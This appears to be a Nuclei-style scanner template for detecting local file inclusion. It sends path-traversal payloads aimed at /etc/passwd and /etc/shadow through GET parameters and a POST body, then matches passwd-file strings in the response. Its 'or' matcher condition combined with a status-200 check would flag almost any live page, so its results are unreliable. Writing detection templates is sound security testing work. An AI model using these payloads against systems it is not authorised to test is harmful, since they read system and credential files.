id: LFI-Detector
info:
  author: Reksy
  name: Local File Inclusion Detector
  severity: High
requests:
- matchers:
  - part: body
    type: word
    words:
    - 'root:x:0:0:'
    - 'bin:x:1:1:'
    - /bin/bash
    - nologin
  - status:
    - 200
    type: status
  matchers-condition: or
  method: GET
  path:
  - '{{BaseURL}}/?page=../../../../../../../../../../etc/passwd'
  - '{{BaseURL}}/?file=../../../../../../../../../../etc/passwd'
  - '{{BaseURL}}/?include=../../../../../../../../../../etc/passwd'
  - '{{BaseURL}}/?page=../../../../../../../../../../etc/shadow'
  - '{{BaseURL}}/?file=../../../../../../../../../../etc/shadow'
  - '{{BaseURL}}/?include=../../../../../../../../../../etc/shadow'
- body: 'page=../../../../../../../../../../etc/passwd

    file=../../../../../../../../../../etc/passwd

    include=../../../../../../../../../../etc/passwd

    '
  matchers:
  - part: body
    type: word
    words:
    - 'root:x:0:0:'
    - 'bin:x:1:1:'
    - /bin/bash
    - nologin
  - status:
    - 200
    type: status
  matchers-condition: or
  method: POST
  path:
  - '{{BaseURL}}/'
